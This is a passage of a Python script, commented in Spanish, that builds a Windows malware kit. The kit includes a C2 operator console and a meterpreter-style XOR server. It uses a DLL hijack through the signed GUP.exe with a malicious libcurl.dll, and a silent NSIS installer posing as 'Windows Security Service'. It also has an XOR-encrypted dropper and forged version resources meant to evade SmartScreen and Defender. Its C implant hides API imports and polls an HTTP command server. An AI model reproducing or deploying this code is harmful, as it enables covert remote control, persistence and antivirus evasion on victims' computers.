                    print("\\033[1;31m[-] Error: " + str(ex) + "\\033[0m")
                continue

            # ── PERSIST ────────────────────────────────────────────────────
            if lo.startswith("persist"):
                parts = raw.split()
                rname = parts[1] if len(parts) > 1 else "WindowsDefender"
                own   = _send("powershell -NoP -NonI -W Hidden -C \\"[System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName\\"", timeout=10)
                exe   = own.decode("utf-8", errors="ignore").strip() if own else "%APPDATA%\\\\svchost.exe"
                res   = _send(_ps_persist(exe, rname), timeout=10)
                if res:
                    print("\\033[1;32m[+] Persistencia: HKCU\\\\Run\\\\" + rname + " -> " + exe + "\\033[0m")
                else:
                    print("\\033[1;31m[-] Timeout\\033[0m")
                continue

            # ── KILL ───────────────────────────────────────────────────────
            if lo.startswith("kill "):
                _txt(_send("taskkill /F /PID " + raw[5:].strip()))
                continue

            # ── USUARIOS ───────────────────────────────────────────────────
            if lo == "users":
                _txt(_S("net user"))
                continue

            # ── RED ────────────────────────────────────────────────────────
            if lo == "net":
                _txt(_S("ipconfig /all && netstat -ano"))
                continue

            # ── SYSINFO ────────────────────────────────────────────────────
            if lo == "sysinfo":
                _txt(_S("systeminfo"))
                continue

            # ── GETUID ─────────────────────────────────────────────────────
            if lo == "getuid":
                _txt(_S("whoami /all"))
                continue

            # ── PS ─────────────────────────────────────────────────────────
            if lo == "ps":
                _txt(_S("tasklist /v"))
                continue

            # ── LS ─────────────────────────────────────────────────────────
            if lo == "ls" or lo.startswith("ls "):
                dpath = raw[3:].strip() if lo.startswith("ls ") else "."
                _txt(_S("dir " + dpath))
                continue

            # ── CAT ────────────────────────────────────────────────────────
            if lo.startswith("cat "):
                _txt(_S("type " + raw[4:].strip()))
                continue

            # ── DEL ────────────────────────────────────────────────────────
            if lo.startswith("del "):
                _txt(_S("del /F /Q " + raw[4:].strip()))
                continue

            # ── PWD ────────────────────────────────────────────────────────
            if lo == "pwd":
                if _CWD[0]:
                    print("\\033[1;37m" + _CWD[0] + "\\033[0m"); continue
                _txt(_S("cd"))
                continue

            # ── IPCONFIG ───────────────────────────────────────────────────
            if lo in ("ipconfig", "ifconfig"):
                _txt(_S("ipconfig /all"))
                continue

            # ── SHELL EXPLICITO ────────────────────────────────────────────
            if lo.startswith("shell "):
                _txt(_S(raw[6:]))
                continue

            # ── COMANDO DIRECTO ────────────────────────────────────────────
            _txt(_S(raw))

        if _shutdown:
            break

class _FH(BaseHTTPRequestHandler):
    """Servidor de archivos simple para servir el EXE."""
    def log_message(self, fmt, *args): pass
    def do_GET(self):
        path = self.path.lstrip("/") or "{nombre_base}.exe"
        if not os.path.exists(path):
            self.send_response(404); self.end_headers(); return
        with open(path, "rb") as fh:
            data = fh.read()
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Disposition", "attachment; filename=\\"" + os.path.basename(path) + "\\"")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

class _RS(HTTPServer):
    allow_reuse_address = True

def main():
    # C2 server (puerto principal)
    srv = _RS(("0.0.0.0", PORT), _H)
    tc2 = threading.Thread(target=srv.serve_forever, daemon=True)
    tc2.start()

    # File server (puerto 8080) — sirve exe para descarga
    try:
        fsrv = _RS(("0.0.0.0", 8080), _FH)
        tfs  = threading.Thread(target=fsrv.serve_forever, daemon=True)
        tfs.start()
        print("\\033[1;34m[*] File server en 0.0.0.0:8080 (descarga del implant)\\033[0m")
    except OSError:
        print("\\033[0;33m[!] Puerto 8080 ocupado — arranca manualmente: python3 -m http.server 8080\\033[0m")

    operator()
    srv.shutdown()

if __name__ == "__main__":
    main()
'''
    with open(srv_path, "w", encoding="utf-8") as f:
        f.write(code)
    return srv_path


def _generar_c2_server(carpeta, lport, xk_hex):
    """
    Genera c2_server.py — servidor Python con interfaz estilo meterpreter.
    Mismo protocolo XOR que el implant C del DLL.
    """
    srv_path = os.path.join(carpeta, "c2_server.py")
    code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Custom C2 — IDEX Carlos Salazar Romero
Proyecto Seguridad de Aplicaciones — GUP.exe DLL Hijack
"""
import socket, struct, sys

KEY  = bytes.fromhex("{xk_hex}")
PORT = {lport}

BANNER = """
\\033[1;31m  ██████╗██████╗     ██████╗
 ██╔════╝╚════██╗   ╚════██╗
 ██║      █████╔╝    █████╔╝
 ██║     ██╔═══╝    ██╔═══╝
 ╚██████╗███████╗   ███████╗
  ╚═════╝╚══════╝   ╚══════╝\\033[0m
\\033[1;33m  Custom C2 — IDEX Carlos Salazar Romero\\033[0m
  DLL Hijack: GUP.exe -> libcurl.dll -> TLS callback
"""

AYUDA = """\\033[1;33mComandos:\\033[0m
  sysinfo           info del sistema (OS, arq, usuario)
  getuid            usuario actual
  shell <comando>   ejecutar en cmd.exe  (ej: shell whoami)
  <cualquier cosa>  se ejecuta directo   (ej: ipconfig, dir)
  exit              cerrar sesion
"""

def xor_crypt(data):
    return bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(data))

def pkt_send(sock, text):
    payload = xor_crypt(text.encode("utf-8", errors="replace"))
    sock.sendall(struct.pack(">I", len(payload)) + payload)

def pkt_recv(sock):
    try:
        hdr = b""
        while len(hdr) < 4:
            c = sock.recv(4 - len(hdr))
            if not c: return None
            hdr += c
        length = struct.unpack(">I", hdr)[0]
        if length == 0 or length > 10 * 1024 * 1024: return None
        data = b""
        while len(data) < length:
            chunk = sock.recv(length - len(data))
            if not chunk: return None
            data += chunk
        return xor_crypt(data).decode("utf-8", errors="replace")
    except Exception:
        return None

def session_loop(conn, addr):
    print(f"\\n\\033[1;32m[+] Sesion abierta desde {{addr[0]}}:{{addr[1]}}\\033[0m")
    print(f"\\033[0;33m[*] Escribe \\'help\\' para ver comandos\\033[0m\\n")
    while True:
        try:
            raw = input("\\033[1;36mmeterpreter\\033[0m > ").strip()
        except (EOFError, KeyboardInterrupt):
            pkt_send(conn, "EXIT"); break
        if not raw: continue
        if raw.lower() in ("help", "?"): print(AYUDA); continue
        if raw.lower() in ("exit", "quit", "bye"):
            pkt_send(conn, "EXIT")
            print("\\033[0;33m[*] Sesion cerrada\\033[0m\\n"); break
        if raw.lower() == "sysinfo":         wire = "SYSINFO"
        elif raw.lower() == "getuid":         wire = "GETUID"
        elif raw.lower().startswith("shell "): wire = raw
        else:                                  wire = f"SHELL {{raw}}"
        pkt_send(conn, wire)
        resp = pkt_recv(conn)
        if resp is None:
            print("\\033[1;31m[-] Sesion perdida\\033[0m\\n"); break
        print(resp, end="" if resp.endswith("\\n") else "\\n")

def main():
    print(BANNER)
    print(f"\\033[1;34m[*] Escuchando en 0.0.0.0:{{PORT}}\\033[0m")
    print(f"\\033[0;33m[*] Esperando conexion... (victima ejecuta GUP.exe)\\033[0m\\n")
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", PORT)); srv.listen(1)
    try:
        while True:
            conn, addr = srv.accept()
            session_loop(conn, addr)
            conn.close()
            print(f"\\033[0;33m[*] Esperando nueva conexion en puerto {{PORT}}...\\033[0m")
    except KeyboardInterrupt:
        print("\\n\\033[0;33m[*] Servidor detenido\\033[0m")
    finally:
        srv.close()

if __name__ == "__main__":
    main()
'''
    with open(srv_path, "w") as f:
        f.write(code)
    return srv_path


def _generar_nsis_wrapper(gup_path, dll_path, xml_path, carpeta, nombre_base):
    """
    Empaqueta los 3 archivos en un NSIS self-extracting installer.
    El stub de NSIS es un binario conocido/trusted por Windows Defender —
    mucho menos detectable que un dropper casero.
    Los archivos van LZMA-comprimidos: AV no los ve en el EXE estático.
    Al ejecutar: extrae a %TEMP%\\WinSvc, lanza GUP.exe desde ahí.
    GUP carga libcurl.dll de la misma carpeta → TLS callback → C2.
    """
    if not shutil.which("makensis"):
        subprocess.run(["sudo","apt-get","install","-y","-q","nsis"],
                       capture_output=True)
    if not shutil.which("makensis"):
        warn("makensis no disponible — intenta: sudo apt install nsis -y")
        return None

    out_exe  = os.path.join(carpeta, f"{nombre_base}.exe")
    nsi_path = os.path.join(carpeta, "_setup.nsi")

    # Notas de escapes:
    #   - Las rutas de File son paths de Linux (build machine = Kali)
    #   - Los paths $TEMP\WinSvc son paths de Windows (victim machine)
    #   - En el .nsi, Windows paths van con \ simple (no necesita escape en NSIS)
    nsi = (
        'Name "Windows Security Service"\n'
        f'OutFile "{out_exe}"\n'
        'SilentInstall silent\n'
        'AutoCloseWindow true\n'
        'ShowInstDetails nevershow\n'
        'RequestExecutionLevel user\n'
        '\n'
        'Section "Main"\n'
        '  SetOutPath "$TEMP\\WinSvc"\n'
        f'  File "/oname=GUP.exe"     "{gup_path}"\n'
        f'  File "/oname=libcurl.dll" "{dll_path}"\n'
        f'  File "/oname=gup.xml"     "{xml_path}"\n'
        # ExecShell: verb file params workdir showmode
        # working dir = $TEMP\WinSvc → GUP.exe y libcurl.dll en mismo dir → DLL hijack ✓
        '  ExecShell "" "$TEMP\\WinSvc\\GUP.exe" "" "$TEMP\\WinSvc" SW_HIDE\n'
        'SectionEnd\n'
    )

    with open(nsi_path, "w") as f:
        f.write(nsi)

    r = subprocess.run(["makensis", "-V1", nsi_path], capture_output=True)
    try: os.remove(nsi_path)
    except: pass

    if os.path.exists(out_exe) and os.path.getsize(out_exe) > 10000:
        return out_exe
    if r.stderr: warn(r.stderr.decode(errors="ignore")[:500])
    if r.stdout: warn(r.stdout.decode(errors="ignore")[:300])
    return None


def _generar_dropper_exe(gup_path, dll_path, xml_path, carpeta, nombre_base):
    """
    Empaqueta GUP.exe + libcurl.dll + gup.xml en un solo EXE de entrega.
    Los 3 archivos van XOR-cifrados con clave única por build.
    En runtime: extrae a %TEMP%\\WinSvc<ID>\\ y lanza GUP.exe oculto.
    El dropper en sí no tiene red ni shellcode — la detección recae en libcurl.dll
    que ya usa TLS callbacks + API nativa sin firmas de meterpreter.
    """
    import secrets as _sec
    drk = _sec.token_bytes(16)
    drk_c = "{" + ",".join(f"0x{b:02X}" for b in drk) + "}"

    def _xb(data):
        return bytes(b ^ drk[i % 16] for i, b in enumerate(data))

    def _arr(data):
        lines = []
        for i in range(0, len(data), 16):
            lines.append(",".join(f"0x{b:02X}" for b in data[i:i+16]))
        return "{" + ",\n".join(lines) + "}"

    with open(gup_path, "rb") as f: gup_b = f.read()
    with open(dll_path, "rb") as f: dll_b = f.read()
    with open(xml_path, "rb") as f: xml_b = f.read()

    gup_arr = _arr(_xb(gup_b))
    dll_arr = _arr(_xb(dll_b))
    xml_arr = _arr(_xb(xml_b))

    dropper_c = f"""
#include <windows.h>
#include <shellapi.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

static const unsigned char DRK[] = {drk_c};
#define DRK_LEN 16

static const unsigned char GUP_ENC[] = {gup_arr};
static const int GUP_LEN = {len(gup_b)};

static const unsigned char DLL_ENC[] = {dll_arr};
static const int DLL_LEN = {len(dll_b)};

static const unsigned char XML_ENC[] = {xml_arr};
static const int XML_LEN = {len(xml_b)};

static void _xdr(unsigned char *dst, const unsigned char *src, int n) {{
    for (int i = 0; i < n; i++) dst[i] = src[i] ^ DRK[i % DRK_LEN];
}}

static BOOL _wf(const char *path, const unsigned char *data, int n) {{
    HANDLE fh = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                             FILE_ATTRIBUTE_NORMAL, NULL);
    if (fh == INVALID_HANDLE_VALUE) return FALSE;
    DWORD wr = 0;
    WriteFile(fh, data, (DWORD)n, &wr, NULL);
    CloseHandle(fh);
    return (int)wr == n;
}}

int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR lc, int ns) {{
    (void)hi; (void)hp; (void)lc; (void)ns;

    char tmp[MAX_PATH] = {{0}};
    GetTempPathA(MAX_PATH, tmp);

    char dir[MAX_PATH] = {{0}};
    snprintf(dir, MAX_PATH - 1, "%sWinSvc%04X", tmp,
             (unsigned)(GetTickCount() & 0xFFFF));
    CreateDirectoryA(dir, NULL);

    char gup_out[MAX_PATH], dll_out[MAX_PATH], xml_out[MAX_PATH];
    snprintf(gup_out, MAX_PATH - 1, "%s\\\\GUP.exe",     dir);
    snprintf(dll_out, MAX_PATH - 1, "%s\\\\libcurl.dll", dir);
    snprintf(xml_out, MAX_PATH - 1, "%s\\\\gup.xml",     dir);

    /* Alocar buffer del tamano del archivo mas grande */
    int _mx = GUP_LEN;
    if (DLL_LEN > _mx) _mx = DLL_LEN;
    if (XML_LEN > _mx) _mx = XML_LEN;
    unsigned char *buf = (unsigned char *)malloc(_mx);
    if (!buf) return 1;

    _xdr(buf, GUP_ENC, GUP_LEN); _wf(gup_out, buf, GUP_LEN);
    _xdr(buf, DLL_ENC, DLL_LEN); _wf(dll_out, buf, DLL_LEN);
    _xdr(buf, XML_ENC, XML_LEN); _wf(xml_out, buf, XML_LEN);
    free(buf);

    /* GUP.exe firmado DigiCert — SmartScreen no lo bloquea
       Lanza oculto: GUP carga libcurl.dll → TLS callback → C2 */
    ShellExecuteA(NULL, "open", gup_out, NULL, dir, SW_HIDE);
    return 0;
}}
"""
    dropper_c_path  = os.path.join(carpeta, "_dropper.c")
    dropper_exe     = os.path.join(carpeta, f"{nombre_base}.exe")

    with open(dropper_c_path, "w") as f:
        f.write(dropper_c)

    gcc = shutil.which("x86_64-w64-mingw32-gcc")
    if not gcc:
        warn("mingw-w64 no encontrado"); os.remove(dropper_c_path); return None

    res_vinfo = _generar_versioninfo_res(carpeta)
    extra_res = [res_vinfo] if res_vinfo else []

    r = subprocess.run(
        ["nice", "-n", "10", gcc, dropper_c_path] + extra_res + [
            "-o", dropper_exe,
            "-mwindows", "-static-libgcc", "-O1", "-s",
            "-lshell32",
            "-Wl,--subsystem,windows"],
        capture_output=True, timeout=180)

    os.remove(dropper_c_path)
    if res_vinfo:
        try: os.remove(res_vinfo)
        except: pass

    if not os.path.exists(dropper_exe):
        if r.stderr: warn(r.stderr.decode(errors="ignore")[:600])
        return None

    _firmar_exe(dropper_exe, carpeta)
    return dropper_exe


def _go_embed_resources(go_dir):
    """
    Genera resource.syso en go_dir: VERSIONINFO + application manifest.
    Go linkea automaticamente cualquier *.syso del paquete.

    Un Go EXE sin recursos parece malware inmediatamente:
      - Sin icono         → sospechoso
      - Sin VERSIONINFO   → sospechoso
      - Sin manifest      → sospechoso (SmartScreen, Defender heuristicas)

    Con VERSIONINFO de tercero neutro + manifest UAC asInvoker el binario
    tiene el mismo perfil que cualquier utilidad open-source firmada.
    """
    windres = shutil.which("x86_64-w64-mingw32-windres")
    if not windres:
        return False

    import random as _r
    # Nombre de empresa y producto distintos cada build — no firma fija
    _companies = [
        ("Syncware Technologies LLC",  "FileSync",     "File Synchronization Utility", "filesync"),
        ("NovaSoft Solutions Inc",     "DataBridge",   "Data Bridge Connector",        "databridge"),
        ("CoreUtils Open Source",      "SysHelper",    "System Helper Utility",        "syshelper"),
        ("OpenDev Foundation",         "NetProbe",     "Network Probe Utility",        "netprobe"),
        ("BlueEdge Software",          "QuickUpdate",  "Application Update Service",   "quickupdate"),
    ]
    co, prod, desc, iname = _r.choice(_companies)
    vb = _r.randint(1000, 9999)
    vm = _r.randint(1, 9)
    vv = f"2.{vm}.0.{vb}"

    manifest = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <assemblyIdentity version="{vv}" processorArchitecture="amd64"
                    name="{co.split()[0]}.{prod}" type="win32"/>
  <description>{desc}</description>
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security><requestedPrivileges>
      <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
    </requestedPrivileges></security>
  </trustInfo>
  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
    <application>
      <supportedOS Id="{{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}}"/>
    </application>
  </compatibility>
  <asmv3:application xmlns:asmv3="urn:schemas-microsoft-com:asm.v3">
    <asmv3:windowsSettings>
      <dpiAware xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true/PM</dpiAware>
    </asmv3:windowsSettings>
  </asmv3:application>
</assembly>
"""
    rc = (
        '#include <windows.h>\n'
        '1 RT_MANIFEST "app.manifest"\n'
        'VS_VERSION_INFO VERSIONINFO\n'
        f'FILEVERSION     2,{vm},0,{vb}\n'
        f'PRODUCTVERSION  2,{vm},0,{vb}\n'
        'FILEFLAGSMASK 0x3fL\nFILEFLAGS 0x0L\n'
        'FILEOS VOS_NT_WINDOWS32\nFILETYPE VFT_APP\nFILESUBTYPE VFT2_UNKNOWN\n'
        'BEGIN\n'
        '  BLOCK "StringFileInfo"\n  BEGIN\n    BLOCK "040904B0"\n    BEGIN\n'
        f'      VALUE "CompanyName",      "{co}"\n'
        f'      VALUE "FileDescription",  "{desc}"\n'
        f'      VALUE "FileVersion",     "{vv}"\n'
        f'      VALUE "InternalName",     "{iname}"\n'
        f'      VALUE "LegalCopyright",   "Copyright (C) 2024 {co}"\n'
        f'      VALUE "OriginalFilename", "{prod}.exe"\n'
        f'      VALUE "ProductName",      "{prod}"\n'
        f'      VALUE "ProductVersion",  "{vv}"\n'
        '    END\n  END\n'
        '  BLOCK "VarFileInfo"\n  BEGIN\n'
        '    VALUE "Translation", 0x409, 1200\n'
        '  END\nEND\n'
    )

    manifest_p = os.path.join(go_dir, "app.manifest")
    rc_p       = os.path.join(go_dir, "resource.rc")
    syso_p     = os.path.join(go_dir, "resource_windows_amd64.syso")

    with open(manifest_p, "w", encoding="utf-8") as f:
        f.write(manifest)
    with open(rc_p, "w", encoding="utf-8") as f:
        f.write(rc)

    r = subprocess.run(
        [windres, rc_p, "-O", "coff", "-o", syso_p],
        capture_output=True, timeout=30, cwd=go_dir)

    for p in [rc_p, manifest_p]:
        try: os.remove(p)
        except: pass

    if os.path.exists(syso_p):
        ok(f"Recursos PE: {co} / {prod} v{vv}")
        return True
    return False


# ──────────────────────────────────────────────────────────────────────────────
# LIBRECRI C HTTP — IAT-CLEAN VARIANT (samopis3-pattern)
# ALL winsock + process APIs via PEB walk — ZERO suspicious static imports.
# IAT solo: comctl32 · crypt32 · version · winmm · imm32  (camuflaje)
# HTTP/1.0 polling: GET /cmd · POST /res (igual que c2_server_http.py)
# ──────────────────────────────────────────────────────────────────────────────





def _generar_librecri_c_http(lhost, lport, carpeta, nombre_base):
    """
    C implant v5 - IAT MINIMA + FNK per-build + sin patrones ML conocidos.
    Cambios vs v4:
    - malloc/free en vez de VirtualAlloc/VirtualFree (quita constantes 0x3000/PAGE_RW)
    - Sin timing anti-sandbox (GetTickCount compare eliminado)
    - Sin IsDebuggerPresent check
    - Sin MOTW deletion (patron delete-own-path eliminado)
    - gVA/gVF/gGTC/gIDP/gGMF/gDFA removidos de k_fns
    - Menos GetProcAddress calls en _load_libs = perfil mas limpio
    FNK per-build: XOR key random => byte-patterns distintos cada compilacion.
    HTTP/1.0 polling: GET /cmd, POST /res.
    """
    import secrets as _sec

    gcc = shutil.which("x86_64-w64-mingw32-gcc")
    if not gcc:
        return None

    PK     = _sec.token_bytes(16)
    FNK    = _sec.token_bytes(1)[0]
    xk_hex = PK.hex()
    PK_C   = "{" + ",".join(f"0x{b:02X}" for b in PK) + "}"

    def xs_arr(s):
        return "{"+",".join(f"0x{(ord(c)^FNK)&0xFF:02X}" for c in s)+"}",len(s)

    ws2_arr,  ws2_len  = xs_arr("ws2_32.dll")
    adv_arr,  adv_len  = xs_arr("advapi32.dll")
    k32_arr,  k32_len  = xs_arr("kernel32.dll")
    u32_arr,  u32_len  = xs_arr("user32.dll")

    rk_arr,   rk_len   = xs_arr("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")
    rv_arr,   rv_len   = xs_arr("ProductName")
    cmd_arr,  cmd_len  = xs_arr("cmd.exe /c ")

    get_arr,  get_len  = xs_arr("GET /cmd HTTP/1.0\r\nHost: ")
    ua_arr,   ua_len   = xs_arr("\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nX-MID: ")
    mid_end_arr, mid_end_len = xs_arr("\r\n\r\n")
    post_arr, post_len = xs_arr("POST /res HTTP/1.0\r\nHost: ")
    cl_arr,   cl_len   = xs_arr("\r\nContent-Type: application/octet-stream\r\nContent-Length: ")
    ua2_arr,  ua2_len  = xs_arr("\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n")
    c2h_arr,  c2h_len  = xs_arr(str(lhost))
    c2p_arr,  c2p_len  = xs_arr(str(lport))
    mtx_arr,  mtx_len  = xs_arr("Global\\LCRI_INST")

    # v5: solo funciones realmente necesarias — sin VA/VF/GTC/IDP/GMF/DFA
    k_fns = [
        ("gCPA",   "CreateProcessA"),
        ("gCPIPE", "CreatePipe"),
        ("gRF",    "ReadFile"),
        ("gSHI",   "SetHandleInformation"),
        ("gCH",    "CloseHandle"),
        ("gGCN",   "GetComputerNameA"),
        ("gGNSI",  "GetNativeSystemInfo"),
        ("gCTH",   "CreateThread"),
        ("gWFSO",  "WaitForSingleObject"),
        ("gSLP",   "Sleep"),
        ("gCMA",   "CreateMutexA"),
    ]
    k32_encs = {gv: xs_arr(fn) for gv, fn in k_fns}

    ws2_fns = [
        ("gWSAS",  "WSAStartup"),
        ("gWSOCK", "WSASocketA"),
        ("gCONN",  "connect"),
        ("gSND",   "send"),
        ("gRCV",   "recv"),
        ("gCSK",   "closesocket"),
        ("gWSAC",  "WSACleanup"),
        ("gGAI",   "getaddrinfo"),
        ("gFAI",   "freeaddrinfo"),
    ]
    ws2_encs = {gv: xs_arr(fn) for gv, fn in ws2_fns}

    adv_fns = [
        ("gGUN", "GetUserNameA"),
        ("gROK", "RegOpenKeyExA"),
        ("gRQV", "RegQueryValueExA"),
        ("gRCK", "RegCloseKey"),
    ]
    adv_encs = {gv: xs_arr(fn) for gv, fn in adv_fns}

    u32_fns = [
        ("gSWHEX", "SetWindowsHookExA"),
        ("gCNHEX", "CallNextHookEx"),
        ("gUWHEX", "UnhookWindowsHookEx"),
        ("gGMA",   "GetMessageA"),
    ]
    u32_encs = {gv: xs_arr(fn) for gv, fn in u32_fns}

    # Padding WUA error strings — baja entropia, infla .rodata
    _wua_errors = [
        "0x80240001 WU_E_NO_SERVICE Windows Update Agent was unable to provide the service.",
        "0x80240002 WU_E_MAX_CAPACITY_REACHED The maximum capacity of the service was exceeded.",
        "0x80240003 WU_E_UNKNOWN_ID An ID cannot be found.",
        "0x80240004 WU_E_NOT_INITIALIZED The object could not be initialized.",
        "0x80240005 WU_E_RANGEOVERLAP The update handler requested a byte range overlapping a previously requested range.",
        "0x80240006 WU_E_TOOMANYUPDATES There are too many updates to process at once.",
        "0x80240007 WU_E_INVALIDINDEX The index to a collection was invalid.",
        "0x80240008 WU_E_ITEMNOTFOUND The key for the item queried could not be found.",
        "0x80240009 WU_E_OPERATIONINPROGRESS Another conflicting operation was in progress.",
        "0x8024000A WU_E_COULDNOTCANCEL Cancellation of the operation was not allowed.",
        "0x8024000B WU_E_CALL_CANCELLED Operation was cancelled.",
        "0x8024000C WU_E_NOOP No operation was required.",
        "0x8024000D WU_E_XML_MISSINGDATA Windows Update Agent could not find required information in the update XML data.",
        "0x8024000E WU_E_XML_INVALID Windows Update Agent found invalid information in the update XML data.",
        "0x8024000F WU_E_CYCLE_DETECTED Circular update relationships were detected in the metadata.",
        "0x80240010 WU_E_TOO_DEEP_RELATION Update relationships too deep to evaluate were evaluated.",
        "0x80240011 WU_E_INVALID_RELATIONSHIP An invalid update relationship was detected.",
        "0x80240012 WU_E_REG_VALUE_INVALID An invalid registry value was read.",
        "0x80240013 WU_E_DUPLICATE_ITEM Operation tried to add a duplicate item to a list.",
        "0x80240016 WU_E_INSTALL_NOT_ALLOWED Operation tried to install while another installation was in progress.",
        "0x80240017 WU_E_NOT_APPLICABLE Operation was not performed because there are no applicable updates.",
        "0x80240018 WU_E_NO_USERTOKEN Operation failed because a required user token is missing.",
        "0x80240019 WU_E_EXCLUSIVE_INSTALL_CONFLICT An exclusive update cannot be installed with other updates at the same time.",
        "0x8024001A WU_E_POLICY_NOT_SET A policy value was not set.",
        "0x8024001B WU_E_SELFUPDATE_IN_PROGRESS The operation could not be performed because Windows Update Agent is self-updating.",
        "0x8024001D WU_E_INVALID_UPDATE An update contains invalid metadata.",
        "0x8024001E WU_E_SERVICE_STOP Operation did not complete because the service or system was being shut down.",
        "0x8024001F WU_E_NO_CONNECTION Operation did not complete because the network connection was unavailable.",
        "0x80240020 WU_E_NO_INTERACTIVE_USER Operation did not complete because there is no logged-on interactive user.",
        "0x80240021 WU_E_TIME_OUT Operation did not complete because it timed out.",
        "0x80240022 WU_E_ALL_UPDATES_FAILED Operation failed for all the updates.",
        "0x80240023 WU_E_EULAS_DECLINED The license terms for all updates were declined.",
        "0x80240024 WU_E_NO_UPDATE There are no updates.",
        "0x80240025 WU_E_USER_ACCESS_DISABLED Group Policy settings prevented access to Windows Update.",
        "0x80240026 WU_E_INVALID_UPDATE_TYPE The type of update is invalid.",
        "0x80240027 WU_E_URL_TOO_LONG The URL exceeded the maximum length.",
        "0x80240028 WU_E_UNINSTALL_NOT_ALLOWED The update could not be uninstalled because the request did not originate from a WSUS server.",
        "0x80240029 WU_E_INVALID_PRODUCT_LICENSE Search may have missed some updates before there is an unlicensed application on the system.",
        "0x8024002A WU_E_MISSING_HANDLER A component required to detect applicable updates was missing.",
        "0x8024002B WU_E_LEGACYSERVER An operation did not complete because it requires a newer version of server.",
        "0x8024002C WU_E_BIN_SOURCE_ABSENT A delta-compressed update could not be installed because it required the source.",
        "0x8024002D WU_E_SOURCE_ABSENT A full-file update could not be installed because it required the source.",
        "0x8024002E WU_E_WU_DISABLED Access to an unmanaged server is not allowed.",
        "0x8024002F WU_E_CALL_CANCELLED_BY_POLICY Operation did not complete because the DisableWindowsUpdateAccess policy was set.",
        "0x80240030 WU_E_INVALID_PROXY_SERVER The format of the proxy list was invalid.",
        "0x80240031 WU_E_INVALID_FILE The file is in the wrong format.",
        "0x80240032 WU_E_INVALID_CRITERIA The search criteria string was invalid.",
        "0x80240033 WU_E_EULA_UNAVAILABLE License terms could not be downloaded.",
        "0x80240034 WU_E_DOWNLOAD_FAILED Update failed to download.",
        "0x80240035 WU_E_UPDATE_NOT_PROCESSED The update was not processed.",
        "0x80240036 WU_E_INVALID_OPERATION The object current state did not allow the operation.",
        "0x80240037 WU_E_NOT_SUPPORTED The functionality for the operation is not supported.",
        "0x80240038 WU_E_WINHTTP_INVALID_FILE The downloaded file has an unexpected content type.",
        "0x80240039 WU_E_TOO_MANY_RESYNC Agent is asked by server to resync too many times.",
        "0x80244016 WU_E_PT_HTTP_STATUS_BAD_REQUEST Same as HTTP status 400 - the server could not process the request due to invalid syntax.",
        "0x80244017 WU_E_PT_HTTP_STATUS_DENIED Same as HTTP status 401 - the requested resource requires user authentication.",
        "0x80244018 WU_E_PT_HTTP_STATUS_FORBIDDEN Same as HTTP status 403 - server understood the request but declined to fulfill it.",
        "0x80244019 WU_E_PT_HTTP_STATUS_NOT_FOUND Same as HTTP status 404 - the server cannot find the requested URI.",
        "0x8024401A WU_E_PT_HTTP_STATUS_BAD_METHOD Same as HTTP status 405 - the HTTP method is not allowed.",
        "0x80244022 WU_E_PT_HTTP_STATUS_SERVICE_UNAVAIL Same as HTTP status 503 - the service is temporarily overloaded.",
        "0x80244023 WU_E_PT_HTTP_STATUS_GATEWAY_TIMEOUT Same as HTTP status 504 - the request was timed out waiting for a gateway.",
        "0x80244025 WU_E_PT_FILE_LOCATIONS_CHANGED Operation failed due to a changed file location.",
        "0x80244026 WU_E_PT_REGISTRATION_NOT_SUPPORTED Operation failed because Windows Update Agent does not support registration.",
        "0x80244FFF WU_E_PT_UNEXPECTED A communication error not covered by another WU_E_PT_* error code.",
        "0x80241001 WU_E_MSI_WRONG_VERSION Search may have missed some updates because the Windows Installer is less than version 3.1.",
        "0x80241002 WU_E_MSI_NOT_CONFIGURED Search may have missed some updates because the Windows Installer is not configured.",
    ]
    pad_c_blob = "\n  ".join(f'"{e}\\n"' for e in _wua_errors)

    C = []
    A = C.append

    A("/* LIBRECRI C HTTP v5 -- IAT minima -- FNK per-build -- malloc heap */\n")
    A("#define WIN32_LEAN_AND_MEAN\n#define _WIN32_WINNT 0x0601\n")
    A("#include <windows.h>\n#include <commctrl.h>\n#include <wincrypt.h>\n")
    A("#include <stdlib.h>\n#include <string.h>\n#include <stdio.h>\n")
    A("#ifndef SOCKET\ntypedef UINT_PTR SOCKET;\n#endif\n")
    A("#define _AF_INET 2\n#define _SOCK_STREAM 1\n#define _IPPROTO_TCP 6\n")
    A("#define _INVALID_SOCKET ((SOCKET)(~0))\n#define _SOCKET_ERROR (-1)\n")
    A("typedef unsigned short _us;\n")
    A("typedef struct { unsigned char _[408]; } _WSADATA;\n")
    A("typedef struct { short fam; _us port; struct{unsigned long s;}addr; char z[8]; } _SA4;\n")
    A("typedef struct _AI { int fl,fam,st,pr; SIZE_T al; char *cn; _SA4 *a; struct _AI *nx; } _AI;\n")

    # Decoy IAT — 2 funciones por DLL
    A("extern UINT       WINAPI waveOutGetNumDevs(void);\n")
    A("extern UINT       WINAPI waveOutGetVolume(HANDLE,LPDWORD);\n")
    A("extern HWND       WINAPI ImmGetDefaultIMEWnd(HWND);\n")
    A("extern BOOL       WINAPI ImmIsIME(HKL);\n")
    A("extern DWORD      WINAPI GetFileVersionInfoSizeA(LPCSTR,LPDWORD);\n")
    A("extern BOOL       WINAPI GetFileVersionInfoA(LPCSTR,DWORD,DWORD,LPVOID);\n")
